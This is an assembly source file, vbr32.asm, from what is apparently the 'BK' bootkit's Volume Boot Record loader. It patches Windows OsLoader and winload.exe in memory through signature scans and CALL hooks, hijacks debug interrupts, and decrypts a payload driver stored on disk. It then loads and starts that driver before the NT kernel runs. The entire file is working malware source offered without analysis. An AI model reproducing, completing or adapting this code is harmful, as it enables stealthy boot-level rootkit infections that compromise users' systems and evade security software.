;//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
;// BK initial loader stub. Version 2.9.2
;//	
;// module: vbr32.asm
;// $Revision: 75 $
;// $Date: 2012-06-14 17:13:00 +0400 (Чт, 14 июн 2012) $
;// description: 
;//	 BK Volume Boot Record. 32-bit functions.

.686p
.model flat, stdcall


include <windows.inc>
include	<catchy32.inc>
include	<vbr.inc>
include	<variables.h>



extern	Core16_start:DWORD
extern	Core16_end:DWORD
extern	Entry16_start:DWORD
extern	Entry16_end:DWORD
extern	Startup16_start:DWORD
extern	Startup16_end:DWORD
extern	Main16_start:DWORD
extern	Main16_end:DWORD
extern	Ofs_start:DWORD
extern	Ofs_end:DWORD


extern	Unpack_start:DWORD
extern	Unpack_end:DWORD
extern	DoMatch_start:DWORD
extern	DoMatch_end:DWORD
extern	GetBit_start:DWORD
extern	GetBit_end:DWORD
extern	NormalCp_start:DWORD
extern	NormalCp_end:DWORD
extern  GetGamma_start:DWORD
extern	GetGamma_end:DWORD

extern	Handler15_start:DWORD
extern	Handler15_end:DWORD
extern	Handler13_start:DWORD
extern	Handler13_end:DWORD
extern	PmInit_start:DWORD
extern	PmInit_end:DWORD

extern	PatchLdr_start:DWORD
extern	PatchLdr_end:DWORD
extern	HookIdt_start:DWORD
extern	HookIdt_end:DWORD

extern	LoadData_start:DWORD
extern	LoadData_end:DWORD


.data 

g_VBR_blocks	dd	Main16_start,		Main16_end,				B_CODE16
				dd	Unpack_start,		Unpack_end + 1,			0
				dd	DoMatch_start,		DoMatch_end + 1,		0
				dd	GetBit_start,		GetBit_end + 1,			0
				dd	GetGamma_start,		GetGamma_end + 1,		0
				dd	NormalCp_start,		NormalCp_end + 1,		0
				dd	ApplyRelocs,		ApplyRelocs_end+1,		0
				dd	Handler13_start,	Handler13_end,			B_CODE16
				dd	Ofs_start,			Ofs_end,				B_CODE16
				dd	PmInit_start,		PmInit_end,				B_CODE16
				dd	GetWinload,			GetWinload_end,			0
				dd	Int1Handler,		Int1Handler_end,		0
				dd	PatchLdr_start,		PatchLdr_end,			B_CODE16
				dd	Winload,			Winload_end+1,			0
				dd	InitNt,				InitNt_end,				0
				dd	TransferHook5,		TransferHook5_end+1,	0	
				dd	LmSwitch,			LmSwitch_end+1,			0
				dd	PatchCall,			PatchCall_end+1,		0
				dd	HookAlloc6,			HookAlloc6_end+1,		0
				dd	LoadFile6,			LoadFile6_end+1,		0			
				dd	RestoreCall,		RestoreCall_end+1,		0
				dd	FileName,			FileName_end,			B_DATA + B_INIT
				dd	GetParamPtr,		GetParamPtr_end+1,		0
				dd	HookAlloc5,			HookAlloc5_end,			0
				dd	LoadFile5,			LoadFile5_end,			0
				dd	RegisterDriver,		RegisterDriver_end+1,	0
				dd  TransferHook6,		TransferHook6_end+1,	0
				dd	HookIdt_start,		HookIdt_end,			B_CODE16
				dd	LoadData_start,		LoadData_end,			B_CODE16
				dd	BuildImage,			BuildImage_end+1,		0
				dd	Handler15_start,	Handler15_end,			B_CODE16
				dd	KernelHook5,		KernelHook5_end+1,		0
				dd	DecryptImage,		DecryptImage_end+1,		0
				dd	Startup16_start,	Startup16_end,			B_CODE16 + B_INIT + B_JUMPS
				
			
;//	---- Special blocks without indexes ----
				dd	Entry16_start,		Entry16_end,			B_ENTRY + B_CODE16 + B_INIT + B_NOEBP
				dd	Core16_start,		Core16_end,				B_CORE + B_CODE16
				dd	0 


.code

PUBLIC	g_VBR_blocks



;// Scans Winload.exe or OSLoader.exe for signatures of instructions executed just before 
;//	 transferring control to the NT kernel.
;// Patches found instruction with "CALL NEAR XXXX" to a execute at this point.
Winload	proc
;// EDX - current instruction
;// ESI	- current code offset
;// EBP - core
	push edi

;// First looking for the '68 4B 23 00 00' pattern, which is 'PUSH 234B'
;// This is for NT5 x86 OsLoader only.
	push edx
	pop edi
	mov ecx, 70000h

	mov al, 068h
@@:
	repnz scasb
	jecxz Winload_next
	cmp dword ptr [edi], 0000234bh	;//  push 234bh
	jnz @B

;// NT5 uses two types of loader: prior to SP3 and after
	sub edi, 20
;// This is for XP SP3 loader
	cmp word ptr [edi], 0b5ffh	;//	 push [ebp+XXXX]
	jz @F
	add edi, 3
	cmp word ptr [edi], 075ffh	;//  push [ebp+XX]
	jz @F

;// This is for XP SP1 and SP2 loader
	add edi, 2
	cmp word ptr [edi], 095ffh	;//	 call [ebp+XXXX]
	jz @F	
	add edi, 3
	cmp word ptr [edi], 055ffh	;//	 call [ebp+XX]
	jz @F
	add edi, 12
	jmp @B
@@:
;// NT5 x86 OsLoader only
	MOV_CL_ID	F_TransferHook5
	jmp Winload_patch

Winload_next:
	push edx
	pop edi
	mov ecx, 0cffffh

	mov al, 0fh
@@:
	repnz scasb
	jecxz Winload_exit
	cmp word ptr [edi], 0d800h		;//  LTR EAX
	jnz @B

	push 40h
	pop ecx
	
	mov al, 0cbh					;// RETF for NT6
	repnz scasb
	jecxz Winload_exit

;//	This is NT6 signature
	MOV_CL_ID	F_TransferHook6

	REXW
	sub edi, 2

Winload_patch:
	call ebp
	db F_PatchCall
Winload_exit:
	pop edi
Winload_end::
	ret
Winload	endp


;// NT6 specific function.
;// Scans winload.exe image for any BlImgAllocateImageBuffer() function call. 
;// Patches the function found.
;// NT6 specific function.
;//	Replaces final RETF instruction within winload!OslArchTransferToKernel function.
;//	KiSystemStartup address is within the stack, address of the Loader Block is the first parameter.
TransferHook6	proc
;// ---- dont't touch this coz it used to store our code base
;// ---- PUSHAD/MOV ESI,XXXX = CODE_BASE_OFFSET
	push esi 
	mov esi, 12345678h

;//---------------------------------------------------------
	push edx
	push edi
	push ebp
	push ecx
	push eax				;//	KiSystemStartup for x86
	
	mov ebp, var_offset_core
	REXW
	add ebp, esi
	
;// Restoring patched bytes to original values
	mov cl, 6
	call ebp
	db F_RestoreCall

;// Getting NT entry address from the stack
	mov cl, 7
	call ebp
	db F_GetParamPtr

	xor eax,eax
	pop edx					;//	KiSystemStartup for x86
	push edx
	REXW
	cmovz edx, [edi]		;//	KiSystemStartup for x64

;// Getting Loader Block address
	mov ecx, [esp+24h]		;// 1st parameter to KiSystemStartup (Loader Block)
	REXW
	cmovz ecx, [esp+8]

;// Initializing loader
	call ebp
	db F_InitNt

	pop eax
	pop ecx
	pop ebp
	pop edi
	pop edx
	pop esi
TransferHook6_end::
	ret
TransferHook6	endp


;// NT5 specific function.
;// Patches KiSystemStartup() entry. Resolves Loader parameter block and initializes payload driver.
KernelHook5	proc
;// ---- dont't touch this coz it used to store our code base
;// ---- PUSHAD/MOV ESI,XXXX = CODE_BASE_OFFSET
	push esi 
	mov esi, 12345678h
;//---------------------------------------------------------
	push edx
	push edi
	push ebp
	push ecx
	
	mov ebp, var_offset_core
	REXW
	add ebp, esi

;// Restoring patched bytes to original values
	mov cl, 5
	call ebp
	db F_RestoreCall

	push ecx			;// Points to original bytes (KiSystemStartup)
	pop edx		

;// Getting Loader Block address
	xor eax,eax
	mov ecx, [esp+1ch]	;// 1st parameter to KiSystemStartup (Loader Block)
	REXW
	cmovz ecx, [esp]

;// Initializing loader
	call ebp
	db F_InitNt

	pop ecx
	pop ebp
	pop edi
	pop edx
	pop esi
KernelHook5_end::
	ret
KernelHook5	endp


;// NT5 specific function.
;// x86 only code
;//	Replaces 'CALL [ebp+XXXX]' or 'PUSH [ebp+XXXX]' instruction within OsLoader!BlOsLoader() function.
;// Takes KiSystemStartup address from the [ebp+XXXX] and hooks it with KernelHook5().
TransferHook5	proc
;// ---- dont't touch this coz it used to store our code base
;// ---- PUSHAD/MOV ESI,XXXX = CODE_BASE_OFFSET
	push esi 
	mov esi, 12345678h
;//---------------------------------------------------------
	push edx
	push edi
	push ebp
	push ecx
	
	mov ebp, var_offset_core
	add ebp, esi

;// Restoring patched bytes to original values
	mov cl, 5
	call ebp
	db F_RestoreCall

	mov eax, [esp+4]			;// Local EBP value
								;// ECX points to original bytes restored (CALL [ebp+XXXX] or PUSH [ebp+XXXX])
	test byte ptr [ecx+1], 80h	;// Checking operand size (byte or dword)
	mov ecx, [ecx+2]			;// Taking operand value
	jnz @F
	movsx ecx, cl				;// Taking a byte, converting to a signed word
@@:
	mov edi, [eax+ecx]			;//	KiSystemStartup address

	MOV_CL_ID	F_KernelHook5
	call ebp
	db F_PatchCall
	
	pop ecx
	pop ebp
	pop edi
	pop edx
	pop esi	
TransferHook5_end::
	ret
TransferHook5	endp

;// NT6 specific function.
;// Scans winload.exe image for any BlImgAllocateImageBuffer() function call. 
;// Patches the function found.
HookAlloc6	proc
;// EDX - any instruction within the Winload.exe
	push edx
	pop edi
	mov ecx, 70000h

;// Looking for the signature.
@@:
	mov al, 12h
	repnz scasb
	jecxz HookAlloc6_end
	cmp dword ptr [edi-1], 0e0000012h
	jnz @B

;// Since 0e0000012h is the 4th parameter of our function there can't be less then 4 PUSHes after "PUSH 0e0000012h" instruction,
;//  so adding instruction length and the size of 4 PUSH opcodes to EDI.
	add edi, (3 + 4)	

;// Looking for the "CALL NEAR XXXX" at the first 16 bytes near the signature.
	push ecx
	mov al, 0e8h
	push 10h
	pop ecx
	repnz scasb
	test ecx,ecx
	pop ecx
	jz @B

;// Patching 
	REXW
	DECL_EDI
	REXW
	add esi, 8

	MOV_CL_ID	F_LoadFile6
	call ebp
	db F_PatchCall

HookAlloc6_end::
	ret
HookAlloc6	endp


;// NT5 specific function.
;// Scans OSLoader.exe image for any BlAllocateAlignedDescriptor() function call. 
;// Patches the function found.
HookAlloc5	proc
;// EDX - any instruction within the OSloader.exe
;// 2 dwords of Pattern on stack
	pushad

	push edx
	pop edi

	mov ecx, 70000h
	mov al, 0e8h
@@:
	repnz scasb
	jecxz HookAlloc5_exit

	cmp dword ptr [edi-5], 196a006ah
	jnz @B

	mov eax, [edi]
	lea edi, [edi+eax+4]

;// Patching found function entry instruction
	add esi, 8

	MOV_CL_ID	F_LoadFile5
	call ebp
	db F_PatchCall
HookAlloc5_exit:
	popad
	ret 
HookAlloc5_end::
HookAlloc5	endp


;// NT5 hook function. 
;//	Hooks BlAllocateAlignedDescriptor(), copies parameters and calls the original one to allocate memory for the driver.
;// Then copies payload driver image into the memory and rebuilds it.
LoadFile5	proc
;// ---- dont't touch this coz it used to store our code base
;// ---- PUSHAD/MOV ESI,XXXX = CODE_BASE_OFFSET
	push esi
	mov esi, 12345678h
;//---------------------------------------------------------
	pushad

;// Loading CORE pointer
	mov ebp, var_offset_core
	add ebp, esi
	sub ebp, 8

;// Restoring patched bytes to original values
	mov cl, 9
	call ebp
	db F_RestoreCall

;// Obtaining function address
	mov edi, ecx

;// Calling original function with original parameters to make sure it will not fail.
;// Old NT5 SP0 OsLoader calls this function before the memory subsystem initializes and this call always fails.
	push 5
	pop ecx
;// Copying original parameters
@@:
	push [esp+11*4+4*4]
	loop @B

;// Calling BlAllocateAlignedDescriptor() function
	call edi

	test eax,eax
;// Saving orginal return value
	mov [esp+9*4], eax
	jz @F

;// The call failed. 
;// Hooking the target function again to try it next time.
	MOV_CL_ID	F_LoadFile5
	call ebp
	db F_PatchCall
	jmp LoadFile5_exit

@@:
;//	The call successed.
	call ebp
	db F_DecryptImage

	push eax	;// Old image base
	push edx	;// Image size

;// Formating call stack, storing parameters
	push esi				;// *ActualBase
	push 1					;// Alignment
	shr edx, 0ch
	push edx				;// PageCount
	push 0					;// BasePage
	push LoaderSystemCode	;// MemoryType

;// Calling BlAllocateAlignedDescriptor() function
	call edi

	mov edi, [esi]
	pop ecx			;// image size
	or edi, 0fff80000h
	shl edi, 0ch
	mov [esi], edi
	pop esi			;// old image base

	call ebp
	db F_BuildImage

LoadFile5_exit:
	popad
	pop esi
;// Restoring original return value
	pop eax
	ret 20
LoadFile5_end::
LoadFile5	endp


;// NT6 hook function. 
;// Hooks BlImgAllocateImageBuffer() function, copies parameters and calls the original one to allocate memory for the driver.
;// Then copies payload driver image into the memory and rebuilds it.
LoadFile6	proc
;// ---- dont't touch this coz it used to store our code base
;// ---- PUSHAD/MOV ESI,XXXX = CODE_BASE_OFFSET
	push esi
	mov esi, 12345678h

;//---------------------------------------------------------
	push eax	;// Saving EAX because there's a parameter passed through it on WIN8
	push edx
	push edi
	push ebp
	push ecx

	mov ebp, var_offset_core
	REXW
	add ebp, esi

	REXW
	sub ebp, 8

;// Restoring patched bytes to original values
	mov cl, 6
	call ebp
	db F_RestoreCall

;// Obtaining function address
	mov edi, [ecx+1]
	lea edi, [ecx+edi+5]

;// Saving registers
	REXB			;//	push r8
	push eax		;//
	REXB			;//	push r9
	push ecx		;//

	call ebp
	db F_DecryptImage

	push eax		;// Old image Base
	push edx		;// image size

	push ebp		;// core pointer
	push esp
	pop ebp

;// Formating call stack, storing parameters
	mov ecx, 0
	push ecx		;// Flags for x64
	push ecx		;// Flags for x86
	push 0			;// AllocationFlags

;// Keeping original value of r9
;//	push 0
;//	REXB			;//	pop r9	
;//	pop ecx			;//

	mov ecx, 0e0000012h
	push ecx		;// AllocationProtect
	push ecx
	xor ecx,ecx
	REXB			;//	pop r8
	pop eax			;//

	jecxz @F
	push 0			;// ImageSize High (only for x86)
@@:

	push edx		;// ImageSize Low
	push esi		;//	pImageBase

	push esi
	pop ecx
	xor eax,eax

;// Calling	BlImgAllocateImageBuffer() function
	call edi

	push ebp
	pop esp
	pop ebp			;// core pointer

	REXW
	mov edi, [esi]

	pop ecx			;// image size
	pop esi			;// old image base

	call ebp
	db F_BuildImage

	REXB			;//	pop r9
	pop ecx			;//
	REXB			;//	pop r8
	pop eax			;//

	pop ecx
	pop ebp
	pop edi
	pop edx
	pop eax
	pop esi
LoadFile6_end::
	ret
LoadFile6	endp


DecryptImage proc
;// returns:
;//  EDX - image size
;//  EAX - image base
;//  ESI - pImageBase
	push edi

	GETPTR	F_FileName
	movzx esi, word ptr [eax]
	push eax
	shl esi, 4

	push esi		;// old image base
	mov edx, (CHSS ptr [eax]).XorValue
	push esi
	pop edi

	movzx ecx, (CHSS ptr [eax]).NumberSectors
	shl ecx, 7
@@:
	lodsd
	ror eax, cl
	xor eax, edx
	sub eax, ecx
	stosd
	loop @B

	pop eax			;// old image base

	mov edx, (IMAGE_DOS_HEADER ptr [eax]).e_lfanew
	add edx, eax
	mov edx, (IMAGE_OPTIONAL_HEADER ptr [(IMAGE_NT_HEADERS ptr [edx]).OptionalHeader]).SizeOfImage

	add edx, 0fffh
	and edx, 0fffff000h
	
	pop esi			;// pImageBase
	pop edi
DecryptImage_end::
	ret
DecryptImage endp


;//	Creates executable image from the specified file image. Processes relocations.
BuildImage	proc
;//  RSI - file base
;//  RDI - new image base
;//  RCX - image size (bytes)
	push ebx

	;// Zeroing new image
	push edi
	shr ecx, 2
	xor eax,eax
	rep stosd
	pop edi

	mov ebx, (IMAGE_DOS_HEADER ptr [esi]).e_lfanew
	REXW
	add ebx, esi

	movzx ecx, (IMAGE_FILE_HEADER ptr [(IMAGE_NT_HEADERS ptr [ebx]).FileHeader]).SizeOfOptionalHeader
	lea edx, (IMAGE_NT_HEADERS ptr [ebx]).OptionalHeader
	REXW
	add edx, ecx

	;// Copying image headers from the start of the image to the start of the first section
	push esi
	push edi
	mov ecx, (IMAGE_SECTION_HEADER ptr [edx]).PointerToRawData
	rep movsb
	pop edi
	pop esi

	;// Copying image sections
	movzx ecx, (IMAGE_FILE_HEADER ptr [(IMAGE_NT_HEADERS ptr [ebx]).FileHeader]).NumberOfSections
@@:
	push ecx
	push esi
	push edi
	mov ecx, (IMAGE_SECTION_HEADER ptr [edx]).VirtualAddress
	REXW
	add edi, ecx
	mov ecx, (IMAGE_SECTION_HEADER ptr [edx]).PointerToRawData
	REXW
	add esi, ecx

	mov ecx, (IMAGE_SECTION_HEADER ptr [edx]).SizeOfRawData

	;// Default file alingment of 0x200 used
	add ecx, 1ffh
	and ecx, (not 1ffh)
	rep movsb

	;// Next section
	REXW
	add edx, sizeof(IMAGE_SECTION_HEADER)

	pop	edi
	pop	esi
	pop ecx
	loop @B

	;// Resolving image relocation table and it's size
	push edi	;// New image base

	REXW
	mov edi, (IMAGE_OPTIONAL_HEADER ptr [(IMAGE_NT_HEADERS ptr [ebx]).OptionalHeader]).BaseOfData	;// ImageBase for x64
	cmp (IMAGE_FILE_HEADER ptr [(IMAGE_NT_HEADERS ptr [ebx]).FileHeader]).Machine, IMAGE_FILE_MACHINE_AMD64
	lea	esi, [ebx+0b0h]
	jz @F
	;// Resolving X86 image
	mov edi, (IMAGE_OPTIONAL_HEADER ptr [(IMAGE_NT_HEADERS ptr [ebx]).OptionalHeader]).ImageBase
	sub esi, 10h
@@:
	pop ebx		;// New image base

	;// Reloc directory RVA
	lodsd
	xchg eax, edx

	;// Reloc directory size
	lodsd
	xchg eax, ecx

	;// Checking if no relocs present
	test edx, edx
	jz @F

	REXW
	add edx, ebx

	call ebp
	db F_ApplyRelocs
@@:	
	pop ebx
BuildImage_end::
	ret
BuildImage	endp


;// Processes image relocation table and applies relocation fixups.
 ApplyRelocs	proc
;// rbx = new image base
;//	rdi = old image base
;// rdx = relocation table
;// ecx = size of the table
	push ebp
	push edx
	pop ebp

_PROCESS_NEXT_RELOCATION_PAGE:
	jecxz _RELOCATIONS_NOT_FOUND
	mov esi, [ebp]							;// next page to apply
	REXW
	add esi, ebx
	
	mov edx, [ebp + 04h]					;// relocs size for current page
	sub ecx, edx
	cmp edx, 00000008h
	ja _CONTINUE
	REXW
	add ebp, edx
	sub ecx, edx
	jmp _PROCESS_NEXT_RELOCATION_PAGE
	
_CONTINUE:
	REXW
	add ebp, 08h
	sub edx, 08h
_CONTINUE1:
	push edx
	push ebx
	movzx edx, word ptr [ebp]
	REXW
	sub ebx, edi
	mov al, dh
	and edx, 0FFFh
	shr al, 4
	cmp al, IMAGE_REL_BASED_DIR64
	jz _DIR64
	cmp al, IMAGE_REL_BASED_HIGHLOW
	jnz _APPLY_NEXT_RELOC
_HIGHLOW:
	REXW
	add edx, esi
	add [edx], ebx
	jmp _APPLY_NEXT_RELOC
_DIR64:
	REXW
	add edx, esi
	REXW
	add ebx, [edx]
	xor eax,eax
	REXW
	mov [edx], ebx
	jz _APPLY_NEXT_RELOC
	add dword ptr [edx+4], 0fffff800h
	btr	dword ptr [edx], 31
_APPLY_NEXT_RELOC:	
	pop ebx
	pop edx
	REXW
	add ebp, 2
	sub edx, 2
	jnz _CONTINUE1
	jmp _PROCESS_NEXT_RELOCATION_PAGE
_RELOCATIONS_NOT_FOUND:	
	
	pop ebp
ApplyRelocs_end::
	ret
ApplyRelocs	endp


;// Restores patched CALL instruction and adjust the retpoint so it points to the restored instruction.
RestoreCall	proc
;// ESI - code base
;//	EDI - stack pointer
;// CL	- number of parameters pushed into the stack
;// returns:
;//	 ECX - original bytes offset
	
	INCL_ECX
	call ebp
	db F_GetParamPtr

	push esi
;// Restoring original code bytes
	sub dword ptr [edi], 5
	REXW
	mov edi, [edi]		
	mov ecx, var_code_size
	push edi
	REXW
	add esi, ecx
	movsb 
	movsd
	pop ecx
	pop esi
RestoreCall_end::
	ret
RestoreCall endp


;// Returns pointer to the parameter within the stack specified by it's index.
;// This is common function fo x86 and x64.
GetParamPtr	proc
;// CL - parameter index
;// returns:
;// EDI - pointer to a parameter 

	movzx ecx, cl
	xor eax, eax
	REXW
	INCL_EAX
	add eax, 2
	xchg eax, ecx
	INCL_EAX
	shl eax, cl
	xchg eax, ecx
	REXW 
	lea edi, [esp+ecx]
GetParamPtr_end::
	ret
GetParamPtr	endp


;// Patches specified offset with "CALL NEAR XXXX" instruction.
PatchCall	proc
;// EDI - offset to patch
;// CL	- hook function index

	push esi
	call ebp
	db F_Ofs

	push eax
	pop edx

	mov ecx, var_code_size
	mov [eax+CODE_BASE_OFFSET], esi

;// Reseting the highest address bit for x86 to x64 address compatibility 
	bt	edi, 31
	jnc @F
	bts edx, 31
@@:
	
	REXW
	add esi, ecx
	REXW
	xchg esi, edi

	movsb
	movsd

	mov byte ptr [esi-5], 0e8h
	REXW
	sub edx, esi
	mov dword ptr [esi-4], edx
	pop esi
PatchCall_end::
	ret
PatchCall	endp


;// Searches for NT kernel base and Loader parameter block. Initializes NT driver.
InitNt	proc
;// ECX - Loader parameter block pointer
;// EDX - any address within the NT image. 
	push edi
	push ebx

	push ecx
	pop ebx

;// Clearing all breakpoints
	mov eax, 00000600h
	mov dr7, eax

;// Searching for NT image base
	push edx
	and word ptr [esp], 0f000h
	pop edx
@@:
	cmp word ptr [edx], 'ZM'
	jz @F
	REXW
	sub edx, 1000h
	jmp @B
@@:

;// ---------------------------------------------------------------------------------------------------------------------
;// Saving loaded module base within the NT kernel (for debugging only)
;	push ecx
;	GETPTR	F_FileName
;	push dword ptr [eax]
;	pop edi			;// Driver base
;	REXW
;	mov [edx+8], edi
;	pop ecx
;// ----------------------------------------------------------------------------------------------------------------------

	REXW
	mov ecx, [ebx]
	REXW
	test ecx, ecx
	js @F
	;// Win7 loader block. There are additional 10h bytes with version and sizes at the beginning.
	REXW
	add ebx, 10h
@@:
	call ebp
	db F_RegisterDriver

InitNt_exit:
	pop ebx
	pop edi
	ret
InitNt_end::
InitNt	endp


;// Allocates and fills BK_LDR_CONTEXT structure and then calls DriverEntry.
RegisterDriver	proc
;// EBX - pointer to Loader parameter block.
;// EDX - NT kernel base.

	push edx
	push esi

	;// Saving x64 volatile registers so they could be used by the driver
	REXB			;//	push r8
	push eax		;//
	REXB			;//	push r9
	push ecx		;//
	REXB			;//	push r10
	push edx		;//
	REXB			;//	push r11
	push ebx		;//

	;// Preserving ESP, coz different architectures will use different number of parameters
	push esp
	pop esi

	;// Allocating and filling BK_LDR_CONTEXT structure on the stack
	push ebx		;// BK_LDR_CONTEXT.NtLoaderBlock
	push edx		;// BK_LDR_CONTEXT.NtImageBase

	;// There should be our driver base replacing it's name
	GETPTR	F_FileName
	push dword ptr [eax]
	pop edi			;// Driver base

	;//	Validating driver base pointer.
	;// It may happen that our driver was not loaded for any reason, 
	;//  in this case the pointer will not point to system addresses.
	REXW
	test edi, edi
	js @F

	;// NT5 x64 OSLoader loads 64-bit drivers in 32-bit mode.
	;// So our driver image base is 32-bit too. And here we have to convert it to the long-mode address.
	btr edi, 31
	jnc RegisterDriver_exit

	push edx
	mov [esp], edi
	pop edi

@@:
	;// Geting driver size and entry point from it's image
	mov ecx, (IMAGE_DOS_HEADER ptr [edi]).e_lfanew
	REXW
	lea edx, [edi+ecx]
	mov ecx, (IMAGE_OPTIONAL_HEADER ptr [(IMAGE_NT_HEADERS ptr [edx]).OptionalHeader]).SizeOfImage
	mov ebx, (IMAGE_OPTIONAL_HEADER ptr [(IMAGE_NT_HEADERS ptr [edx]).OptionalHeader]).AddressOfEntryPoint

	REXW 
	add ebx, edi

	push ecx		;// BK_LDR_CONTEXT.DriverSize
	push ebx		;//	BK_LDR_CONTEXT.DriverEntry
	push edi		;//	BK_LDR_CONTEXT.DriverBase

	;//	Initializing parameters
	push esp
	pop edx
	
	;// Aligning stack 
	push edx
	and dword ptr [esp], 0fffffff0h
	pop esp
	
	xor ecx,ecx
	push ecx
	push ecx
	push edx
	push ecx
	;// Calling our driver entry
	call ebx	

	;// Geting driver size and entry point from it's image
	mov ecx, (IMAGE_DOS_HEADER ptr [edi]).e_lfanew
	REXW
	add ecx, edi

	;// Setting IMAGE_FILE_RELOCS_STRIPPED flags to make sure our driver will not be relocated by MiReloadBootLoadedDrivers.
	;// The reason is that there are global linked structures like BOOT_DRIVER_LIST_ENTRY within our driver's data section.
	or	(IMAGE_FILE_HEADER ptr [(IMAGE_NT_HEADERS ptr [ecx]).FileHeader]).Characteristics, IMAGE_FILE_RELOCS_STRIPPED

RegisterDriver_exit:
	;// Restoring ESP
	push esi
	pop esp	

	;// Restoring x64 volatile registers
	REXB			;//	pop r11
	pop ebx			;//
	REXB			;//	pop r10
	pop edx			;//
	REXB			;//	pop r9
	pop ecx			;//
	REXB			;//	pop r8
	pop eax			;//

	pop esi
	pop edx
RegisterDriver_end::
	ret
RegisterDriver	endp


;// Searches for "CALL Reg32" instruction that gives control to winload!OslMain() function
;// Patches at "CALL Reg32" with "CALL GetWinload()" instruction.
LmSwitch proc
	push edi
	lea edi, [edx+3]
	push 7Fh
	pop ecx
	mov al, 0ffh
@@:
	repnz scasb
	jecxz LmSwitch_exit
	mov ah, byte ptr [edi]
	and ah, 0fch
	cmp ah, 0d0h			;// CALL Reg32
	jnz @B

	lea eax, [edi-2]
	dec edi
	cmp byte ptr [eax], 048h
	cmovz edi, eax
	
	MOV_CL_ID F_GetWinload
	call ebp
	db F_PatchCall

	xor eax,eax
LmSwitch_exit:
	pop edi
LmSwitch_end::
	ret
LmSwitch endp


;// NT6 hook function.
;// Scans winload.exe for 2 signatures and patches it two times: one for loading a drivers and one for processing NT load. 
GetWinload	proc
;// ---- dont't touch this coz it used to store our code base
;// ---- PUSHAD/MOV ESI,XXXX = CODE_BASE_OFFSET
	push esi
	mov esi, 12345678h
;//---------------------------------------------------------
	push edi
	push ebp
	push ebx
	push edx
	push ecx
	push eax

	mov ebp, var_offset_core
	REXW
	add ebp, esi

;// Restoring original code bytes
	mov cl, 7
	call ebp
	db F_RestoreCall

;// Checking original bytes to find ot the register used in "CALL Reg32" instruction.
	cmp byte ptr [ecx], 48h
	mov edx, [ecx+2]
	mov ecx, [ecx+1]
	cmovz ecx, edx
	and ecx, 3

;// Getting value of the call register. It should be the entry point of winload.exe module.
	call ebp
	db F_GetParamPtr

	push [edi]
	pop edx
	push edx

;// Calling Winload patch routine
	call ebp
	db F_Winload

;// Calling file load patch routine
	pop edx
	call ebp
	db F_HookAlloc6

	pop eax
	pop ecx
	pop edx
	pop ebx
	pop ebp
	pop edi
	pop esi
	ret
GetWinload_end::
GetWinload	endp


;// INT1 handler routine.
;// Used to process DR-breaking and tracing.
Int1Handler	proc
;// ---- dont't touch this coz it used to store our code base
;// ---- PUSH ESI/MOV ESI,XXXX = CODE_BASE_OFFSET
	push esi
	mov esi, 12345678h
;// ----------------------------------------------------------
;// Saving all registers used. Reinitializing DS and ES.
	push eax
	mov ax, ds
	push eax
	mov ax, es
	push eax
	mov ax, ss
	mov ds, ax
	mov es, ax

	push ecx
	push edx
	push ebp

;// Checking break condition
	mov ecx, dr6
	btr ecx, 2					;// DR2 break
	mov dr6, ecx
	setc cl

;// Clearing our breakpoints (if any)
	mov eax, dr7
	jc @F
	and eax, (not 00030002h)	;// Disable	DR0 break
@@:
	and eax, (not 00000020h)	;// Disable DR2 break
	mov dr7, eax

;// Initializing CORE pointer
	mov ebp, var_offset_core
	REXW
	add ebp, esi

;// Examining call stack, obtaining retpoint
	xor eax,eax
	REXW
	mov edx, [esp+1ch]				;// retpoint for x86
;// 64-bit code ends here, leaving
	jz Int1_pop_and_leave

	inc dword ptr [esp+14h]			;// to compensate REXW before IRETD

;// 32-bit only code here.
;// Any function called from here should preserve EBX and EDI
check_codes:
;// Checking if breaked on OsLoader entry.
	test cl, cl	
	jnz check_nt5

;// Checking if this is NT5 
;//	This code added for NT5 SP0 that has OsLoader entry point other then 0x401000 and also relocates IDT within it.
	push ecx
	sidt [esp-2]
	pop ecx
	test cl, cl
	jnz lmswitch

check_nt5:
;// NT5 and NT6 x86. 
	push edx
	call ebp
	db F_Winload
	pop edx

;// Hooking memory allocation routime
	call ebp
	db F_HookAlloc5

;// Clearing EAX to reset trace
	xor eax,eax
	jmp Int1_exit

lmswitch:
;// Searching for GTDR or IDTR load instruction.
;//	BOOTMGR reloads GDT and LDT just before calling WINLOAD.EXE.
	cmp word ptr [edx], 010fh		;// any kind of GDT or IDT operation
	jnz Int1_exit

	test byte ptr [edx+2], 10h		;// LOAD operation (LGDT or LIDT)
	jz Int1_exit
	call ebp
	db F_LmSwitch

Int1_exit:
;// Setting or reseting TF, depending on EAX value.
;// Acctually TF is set until LmSwitch returns 0.
	and byte ptr [esp+24h+1], 0feh
	test eax,eax
	jz Int1_pop_and_leave
	or byte ptr [esp+24h+1], 1		;// set TF
Int1_pop_and_leave:
;// Restoring all registers used
	pop ebp
	pop edx
	pop ecx

	pop eax
	mov es, ax
	pop eax
	mov ds, ax
	pop eax
	pop esi
	REXW
	iretd
Int1Handler_end::
Int1Handler	endp


;// Place to store the payload driver address on disk (LBA) and it's size
FileName	proc
	db	sizeof(CHSS)	dup (33h)
FileName_end::
FileName	endp


 ;//--- API -----------------------------------------------------------------------------------------------------------------
 
 
GetInstructionLen proc buf:DWORD
	push esi
	mov esi, buf
	call c_Catchy
	pop esi
    ret
GetInstructionLen EndP


end